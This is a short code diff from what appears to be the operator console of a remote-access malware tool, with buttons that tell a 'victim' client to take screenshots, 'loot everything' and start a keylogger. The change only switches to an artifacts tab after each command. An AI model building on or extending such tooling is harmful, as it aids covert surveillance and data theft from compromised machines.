@@ -213,6 +213,7 @@ void drawConnectionsTab(WindowState& state) {
         if (GuiButton(btn4, "Take Screenshot")) {
             if (state.client.sendScreenshotCommand((victim.uid))) {
                 logMan.attack_log(std::format("Screenshot Command Send to Client: {}", victim.uid));
+                state.current_tab = Tab::ARTIFACTS;
             } else {
                 logMan.local_log("Sending Screenshot Command failed!");
             }
@@ -221,6 +222,7 @@ void drawConnectionsTab(WindowState& state) {
         if (GuiButton(btn5, "Loot Everything!")) {
             if (state.client.sendLootCommand(victim.uid)) {
                 logMan.attack_log(std::format("Loot Command Send to Client: {}", victim.uid));
+                state.current_tab = Tab::ARTIFACTS;
             } else {
                 logMan.local_log("Sending Loot Command failed!");
             }
@@ -229,6 +231,7 @@ void drawConnectionsTab(WindowState& state) {
         if (GuiButton(btn6, "Start Keylogger")) {
             if (state.client.sendStartKeyloggerCommand(victim.uid)) {
                 logMan.attack_log(std::format("Starting Keylogger on Client: {}", victim.uid));
+                state.current_tab = Tab::ARTIFACTS;
             } else {
                 logMan.local_log("Starting Keylogger failed!");
             }
